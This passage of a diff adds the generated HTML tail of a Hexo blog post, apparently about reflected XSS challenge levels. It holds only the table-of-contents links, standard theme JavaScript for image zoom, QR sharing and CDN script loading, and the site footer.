class="toc-nav-text">level6</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#level7"><span class="toc-nav-text">level7</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#level8"><span class="toc-nav-text">level8</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#level9"><span class="toc-nav-text">level9</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#level10"><span class="toc-nav-text">level10</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#level11"><span class="toc-nav-text">level11</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#level12"><span class="toc-nav-text">level12</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#level13"><span class="toc-nav-text">level13</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#level14"><span class="toc-nav-text">level14</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#level15"><span class="toc-nav-text">level15</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#level16"><span class="toc-nav-text">level16</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#level17"><span class="toc-nav-text">level17</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#level18"><span class="toc-nav-text">level18</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#level19"><span class="toc-nav-text">level19</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#level20"><span class="toc-nav-text">level20</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-nav-text">总结</span></a></li></ol></li></ol></li></ol>
+    
+  </div>
+</aside>
+  
+  <!-- Catalog END -->
+</main>
+
+<script>
+  (function () {
+    var url = 'http://example.com/2022/04/21/基础反射型xss/';
+    var banner = ''
+    if (banner !== '' && banner !== 'undefined' && banner !== 'null') {
+      $('#article-banner').css({
+        'background-image': 'url(' + banner + ')'
+      })
+    } else {
+      $('#article-banner').geopattern(url)
+    }
+    $('.header').removeClass('fixed-header')
+
+    // error image
+    $(".markdown-content img").on('error', function() {
+      $(this).attr('src', '/css/images/error_icon.png')
+      $(this).css({
+        'cursor': 'default'
+      })
+    })
+
+    // zoom image
+    $(".markdown-content img").on('click', function() {
+      var src = $(this).attr('src')
+      if (src !== '/css/images/error_icon.png') {
+        var imageW = $(this).width()
+        var imageH = $(this).height()
+
+        var zoom = ($(window).width() * 0.95 / imageW).toFixed(2)
+        zoom = zoom < 1 ? 1 : zoom
+        zoom = zoom > 2 ? 2 : zoom
+        var transY = (($(window).height() - imageH) / 2).toFixed(2)
+
+        $('body').append('<div class="image-view-wrap"><div class="image-view-inner"><img src="'+ src +'" /></div></div>')
+        $('.image-view-wrap').addClass('wrap-active')
+        $('.image-view-wrap img').css({
+          'width': `${imageW}`,
+          'transform': `translate3d(0, ${transY}px, 0) scale3d(${zoom}, ${zoom}, 1)`
+        })
+        $('html').css('overflow', 'hidden')
+
+        $('.image-view-wrap').on('click', function() {
+          $(this).remove()
+          $('html').attr('style', '')
+        })
+      }
+    })
+  })();
+</script>
+
+
+  <script>
+    var qr = new QRious({
+      element: document.getElementById('share-qrcode'),
+      value: document.location.href
+    });
+  </script>
+
+
+
+
+
+
+    <div class="scroll-top">
+  <span class="arrow-icon"></span>
+</div>
+    <footer class="app-footer">
+  <p class="copyright">
+    &copy; 2022 | Proudly powered by <a href="https://hexo.io" target="_blank">Hexo</a>
+    <br>
+    Theme by <a target="_blank" rel="noopener" href="https://github.com/yanm1ng">yanm1ng</a>
+  </p>
+</footer>
+
+<script>
+  function async(u, c) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+</script>
+<script>
+  async("//cdnjs.cloudflare.com/ajax/libs/fastclick/1.0.6/fastclick.min.js", function(){
+    FastClick.attach(document.body);
+  })
+</script>
+
+<script>
+  var hasLine = 'true';
+  async("//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js", function(){
+    $('figure pre').each(function(i, block) {
+      var figure = $(this).parents('figure');
+      if (hasLine === 'false') {
+        figure.find('.gutter').hide();
+      }
+      hljs.configure({useBR: true});
+      var lang = figure.attr('class').split(' ')[1] || 'code';
+      var codeHtml = $(this).html();
+      var codeTag = document.createElement('code');
+      codeTag.className = lang;
+      codeTag.innerHTML = codeHtml;
+      $(this).attr('class', '').empty().html(codeTag);
+      figure.attr('data-lang', lang.toUpperCase());
+      hljs.highlightBlock(block);
+    });
+  })
+</script>
+<!-- Baidu Tongji -->
+
+
+<script src="/js/script.js"></script>
+
+
+  </body>
+</html>
